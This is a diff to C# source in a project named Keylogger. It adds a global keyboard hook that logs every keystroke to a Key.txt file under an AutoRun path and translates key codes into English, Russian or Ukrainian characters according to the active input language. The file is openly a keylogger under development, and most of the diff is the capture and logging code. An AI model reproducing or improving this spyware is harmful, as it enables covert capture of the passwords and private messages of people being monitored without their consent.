@@ -1,10 +1,16 @@
 ﻿using System;
+using System.Diagnostics;
+using System.Globalization;
 using System.IO;
 using System.Windows;
 using System.Windows.Controls;
 using System.Runtime.InteropServices;
+using System.Windows.Input;
 using System.Windows.Interop;
 using System.Windows.Threading;
+using System.Linq;
+using System.Globalization;
+
 
 
 
@@ -27,7 +33,8 @@ namespace Keylogger
         #endregion
 
         DispatcherTimer timer = new DispatcherTimer();
-        Keylog keylog = new Keylog();
+       
+        //Keylog keylog = new Keylog();
 
 
         public MainWindow()
@@ -43,20 +50,85 @@ namespace Keylogger
 
         }
 
-        #region TESTST
+        #region KEY_WRITE
 
         globalKeyboardHook gkh = new globalKeyboardHook();
-        private void HookAll()
+        private int nextline = 0;
+       
+        char[] RKey = new char[] { '0','1', '2', '3', '4', '5', '6', '7', '8', '9', 'Ё', 'Х', 'Ъ','Ж','Э','Б','Ю','.',
+            'Й', 'Ц', 'У', 'К', 'Е', 'Н', 'Г', 'Ш', 'Щ', 'З','Ф', 'Ы', 'В', 'А', 'П',
+            'Р', 'О', 'Л', 'Д', 'Я', 'Ч', 'С', 'М', 'И', 'Т', 'Ь'};
+        char[] UKey = new char[]{
+            '0','1', '2', '3', '4', '5', '6', '7', '8', '9', '\'', 'Х', 'Ї','Ж','Є','Б','Ю','.',
+            'Й', 'Ц', 'У', 'К', 'Е', 'Н', 'Г', 'Ш', 'Щ', 'З','Ф', 'І', 'В', 'А', 'П',
+            'Р', 'О', 'Л', 'Д', 'Я', 'Ч', 'С', 'М', 'И', 'Т', 'Ь'
+            };
+
+        char[] EKey = new char[]
         {
-            foreach (object key in Enum.GetValues(typeof(System.Windows.Forms.Keys)))
-            {
-                gkh.HookedKeys.Add((System.Windows.Forms.Keys)key);
-            }
-        }
+            '0', '1', '2', '3', '4', '5', '6', '7', '8', '9', '`', '[', ']', ';', '\'', ',', '.', '/',
+            'Q', 'W', 'E', 'R', 'T', 'Y', 'U', 'I', 'O', 'P', 'A', 'S', 'D', 'F', 'G', 'H', 'J', 'K', 'L', 'Z', 'X', 'C',
+            'V', 'B', 'N', 'M'
+        };
+
+        System.Windows.Forms.Keys[] keys = new System.Windows.Forms.Keys[]
+        {
+                System.Windows.Forms.Keys.D0,
+                System.Windows.Forms.Keys.D1,
+                System.Windows.Forms.Keys.D2,
+                System.Windows.Forms.Keys.D3,
+                System.Windows.Forms.Keys.D4,
+                System.Windows.Forms.Keys.D5,
+                System.Windows.Forms.Keys.D6,
+                System.Windows.Forms.Keys.D7,
+                System.Windows.Forms.Keys.D8,
+                System.Windows.Forms.Keys.D9,
+                System.Windows.Forms.Keys.Oem3,
+                System.Windows.Forms.Keys.OemOpenBrackets,
+                System.Windows.Forms.Keys.Oem6,
+                System.Windows.Forms.Keys.Oem1,
+                System.Windows.Forms.Keys.Oem7,
+                System.Windows.Forms.Keys.Oemcomma,
+                System.Windows.Forms.Keys.OemPeriod,
+                System.Windows.Forms.Keys.OemQuestion,
+                System.Windows.Forms.Keys.Q,
+                System.Windows.Forms.Keys.W,
+                System.Windows.Forms.Keys.E,
+                System.Windows.Forms.Keys.R,
+                System.Windows.Forms.Keys.T,
+                System.Windows.Forms.Keys.Y,
+                System.Windows.Forms.Keys.U,
+                System.Windows.Forms.Keys.I,
+                System.Windows.Forms.Keys.O,
+                System.Windows.Forms.Keys.P,
+                System.Windows.Forms.Keys.A,
+                System.Windows.Forms.Keys.S,
+                System.Windows.Forms.Keys.D,
+                System.Windows.Forms.Keys.F,
+                System.Windows.Forms.Keys.G,
+                System.Windows.Forms.Keys.H,
+                System.Windows.Forms.Keys.J,
+                System.Windows.Forms.Keys.K,
+                System.Windows.Forms.Keys.L,
+                System.Windows.Forms.Keys.Z,
+                System.Windows.Forms.Keys.X,
+                System.Windows.Forms.Keys.C,
+                System.Windows.Forms.Keys.V,
+                System.Windows.Forms.Keys.B,
+                System.Windows.Forms.Keys.N,
+                System.Windows.Forms.Keys.M
+        };
+        //private void HookAll()
+        //{
+        //    //foreach (object key in Enum.GetValues(typeof(System.Windows.Forms.Keys)))
+        //    //{
+        //    //    gkh.HookedKeys.Add((System.Windows.Forms.Keys)key);
+        //    //}
+        //}
         private void Form1_Load()
         {
             gkh.KeyDown += new System.Windows.Forms.KeyEventHandler(gkh_KeyDown);
-            HookAll();
+            //HookAll();
             if (File.Exists(AutoRun.Path() + "Key.txt"))
             {
                 //File.Delete(AutoRun.Path() + "Key.txt");
@@ -64,9 +136,116 @@ namespace Keylogger
         }
         void gkh_KeyDown(object sender, System.Windows.Forms.KeyEventArgs e)
         {
-            StreamWriter SW = new StreamWriter(AutoRun.Path() + "Key.txt", true);
-            SW.Write(e.KeyCode);
-            SW.Close();
+            //StreamWriter SW = new StreamWriter(AutoRun.Path() + "Key.txt", true);
+            
+            bool nonNumberEntered = false;
+            string ilm = InputLanguageManager.Current.CurrentInputLanguage.ToString();
+            //System.Windows.Forms.InputLanguage myCurrentLanguage = System.Windows.Forms.InputLanguage.CurrentInputLanguage;
+            //string ilm = myCurrentLanguage.LayoutName;
+            //Process curProcess = new Process();
+            //ProcessModule curModule = curProcess.MainModule;
+            
+            //MessageBox.Show(curProcess.MainWindowTitle);
+
+            using (StreamWriter SW = new StreamWriter(AutoRun.Path() + "Key.txt", true))
+            {
+                if (nextline >= 70)
+                {
+                    SW.WriteLine();
+                    nextline = 0;
+                }
+
+                if (!keys.Contains(e.KeyCode))
+                {
+                    if (e.KeyCode == System.Windows.Forms.Keys.Space)
+                        SW.Write(" ");
+                    if(e.KeyCode == System.Windows.Forms.Keys.Return)
+                        SW.WriteLine();
+                    if(e.KeyCode == System.Windows.Forms.Keys.Multiply)
+                        SW.Write("*");
+                    if (e.KeyCode == System.Windows.Forms.Keys.Divide)
+                        SW.Write("/");
+                    if (e.KeyCode == System.Windows.Forms.Keys.OemMinus)
+                        SW.Write("-");
+                    if (e.KeyCode == System.Windows.Forms.Keys.Oemplus)
+                        SW.Write("+");
+                    if (e.KeyCode == System.Windows.Forms.Keys.NumPad0)
+                        SW.Write("0");
+                    if (e.KeyCode == System.Windows.Forms.Keys.NumPad1)
+                        SW.Write("1");
+                    if (e.KeyCode == System.Windows.Forms.Keys.NumPad2)
+                        SW.Write("2");
+                    if (e.KeyCode == System.Windows.Forms.Keys.NumPad3)
+                        SW.Write("3");
+                    if (e.KeyCode == System.Windows.Forms.Keys.NumPad4)
+                        SW.Write("4");
+                    if (e.KeyCode == System.Windows.Forms.Keys.NumPad5)
+                        SW.Write("5");
+                    if (e.KeyCode == System.Windows.Forms.Keys.NumPad6)
+                        SW.Write("6");
+                    if (e.KeyCode == System.Windows.Forms.Keys.NumPad7)
+                        SW.Write("7");
+                    if (e.KeyCode == System.Windows.Forms.Keys.NumPad8)
+                        SW.Write("8");
+                    if (e.KeyCode == System.Windows.Forms.Keys.NumPad9)
+                        SW.Write("9");
+                    if (e.KeyCode == System.Windows.Forms.Keys.Add)
+                        SW.Write("+");
+                    if (e.KeyCode == System.Windows.Forms.Keys.Subtract)
+                        SW.Write("-");
+                    else SW.Write("");
+                    nextline++;
+                    
+
+                }
+                
+                else
+                {
+                    switch (ilm)
+                    {
+                        case "en-US":
+                            try
+                            {
+                                SW.Write(EKey[keys.ToList().IndexOf(e.KeyCode)].ToString());
+                                nextline++;
+                            }
+                            catch (Exception ex)
+                            {
+                                MessageBox.Show(ex.ToString());
+                            }
+                            break;
+                        case "ru-RU":
+                            try
+                            {
+                                string rus = RKey[keys.ToList().IndexOf(e.KeyCode)].ToString();
+                                SW.Write(rus, true);
+                                nextline++;
+                            }
+                            catch (Exception ex)
+                            {
+                                MessageBox.Show(ex.ToString());
+                            }
+                            break;
+                        case "uk-UA":
+                            try
+                            {
+                                string ukr = UKey[keys.ToList().IndexOf(e.KeyCode)].ToString();
+                                SW.Write(ukr, true);
+                                nextline++;
+                            }
+                            catch (Exception ex)
+                            {
+                                MessageBox.Show(ex.ToString());
+                            }
+                            break;
+                        default:
+                            SW.Write(e.KeyCode);
+                            break;
+                    }
+                }
+                SW.Close();
+            }
+
         }
 
         #endregion
